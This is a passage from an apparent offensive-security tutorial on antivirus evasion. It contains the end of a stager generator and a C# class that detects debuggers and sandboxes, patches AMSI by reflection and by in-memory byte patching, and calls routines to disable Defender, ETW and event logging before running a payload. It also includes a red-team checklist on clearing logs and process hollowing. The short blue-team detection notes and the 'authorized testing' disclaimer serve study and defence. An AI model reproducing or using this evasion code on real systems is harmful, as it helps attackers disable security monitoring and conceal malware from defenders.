        uri=''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10))
    )

    return stager

print(generate_stager())
```

## Complete Evasion Framework

### All-in-One Evasion Class

```csharp
using System;
using System.Runtime.InteropServices;
using System.Diagnostics;

public class UltimateEvasion
{
    // Collection of all evasion techniques

    public static bool FullEvasionStack()
    {
        // Layer 1: Environment checks
        if (IsDebugged()) return false;
        if (IsSandboxed()) return false;
        if (IsVirtualized()) return false;

        // Layer 2: Disable security
        DisableWindowsDefender();
        PatchAMSI();
        PatchETW();

        // Layer 3: Hide presence
        HideFromTaskManager();
        DisableEventLogging();

        // Layer 4: Execute payload
        return ExecutePayload();
    }

    static bool IsDebugged()
    {
        // Multiple debugger checks
        if (Debugger.IsAttached) return true;
        if (IsDebuggerPresent()) return true;

        bool isDebugged = false;
        CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebugged);

        return isDebugged;
    }

    static bool IsSandboxed()
    {
        // Check for sandbox indicators
        string[] sandboxDlls = { "sbiedll.dll", "dbghelp.dll", "api_log.dll" };

        foreach (string dll in sandboxDlls)
        {
            if (GetModuleHandle(dll) != IntPtr.Zero)
                return true;
        }

        // Check processes
        string[] sandboxProcesses = { "vmsrvc", "tcpview", "wireshark", "processhacker" };

        foreach (string procName in sandboxProcesses)
        {
            if (Process.GetProcessesByName(procName).Length > 0)
                return true;
        }

        return false;
    }

    static void PatchAMSI()
    {
        // Multiple AMSI bypass methods
        try
        {
            // Method 1: Reflection
            var amsiUtils = Type.GetType("System.Management.Automation.AmsiUtils");
            var amsiInitFailed = amsiUtils.GetField("amsiInitFailed",
                System.Reflection.BindingFlags.NonPublic | System.Reflection.BindingFlags.Static);
            amsiInitFailed.SetValue(null, true);
        }
        catch
        {
            // Method 2: Memory patching
            IntPtr amsiDll = LoadLibrary("amsi.dll");
            IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");

            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };

            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, 0x40, out uint oldProtect);
            Marshal.Copy(patch, 0, amsiScanBuffer, patch.Length);
            VirtualProtect(amsiScanBuffer, (UIntPtr)patch.Length, oldProtect, out _);
        }
    }

    [DllImport("kernel32.dll")]
    static extern bool IsDebuggerPresent();

    [DllImport("kernel32.dll")]
    static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
```

## Detection/OPSEC Notes

### Red Team OPSEC Checklist

```
Pre-Execution:
□ Environment fingerprinting
□ Sandbox detection
□ Security product enumeration
□ Time-based delays

During Execution:
□ ETW disabled
□ AMSI bypassed
□ Minimal API calls
□ Direct syscalls when possible
□ Process hollowing/ghosting

Post-Execution:
□ Clear event logs
□ Remove artifacts
□ Restore hooks
□ Clean memory

Behavioral OPSEC:
□ Match normal process behavior
□ Use legitimate process names
□ Maintain expected network patterns
□ Avoid suspicious parent/child relationships
```

### Blue Team Detection Opportunities

**Key Detection Points:**
1. **Memory Anomalies**
   - Executable heap allocations
   - Modified .text sections
   - Unbacked executable memory

2. **API Hooking Detection**
   - Compare ntdll on disk vs memory
   - Check for JMP instructions at function start
   - Validate syscall numbers

3. **Behavioral Analysis**
   - Process injection patterns
   - Unusual process relationships
   - Network connections from unexpected processes

4. **ETW/AMSI Monitoring**
   - Detection of patching attempts
   - Missing telemetry events
   - AMSI bypass indicators

## Conclusion

Advanced AV evasion is an arms race. Today's advanced technique is tomorrow's signature. The key principles:

1. **Layer your evasion** - Don't rely on single techniques
2. **Understand the technology** - Know how AV/EDR works
3. **Test extensively** - What works in lab may fail in production
4. **Stay current** - Techniques evolve rapidly
5. **Think creatively** - Best bypasses are novel approaches

Remember: With great power comes great responsibility. Use these techniques only for authorized security testing and defense improvement.

## Lab Exercises

1. **Build a Polymorphic Engine** - Create code that mutates on each execution
2. **Implement Process Ghosting** - Create process from deleted file
3. **Direct Syscall Framework** - Build Hell's Gate implementation
4. **ETW/AMSI Bypass Toolkit** - Compile multiple bypass methods
5. **Sandbox Detection Suite** - Comprehensive environment checking

## Additional Resources

- [Offensive Security Research](https://github.com/offensive-security)
- [Red Team Notes](https://www.ired.team/)
- [VX Underground Papers](https://vx-underground.org/papers.html)
- [Sektor7 Courses](https://institute.sektor7.net/)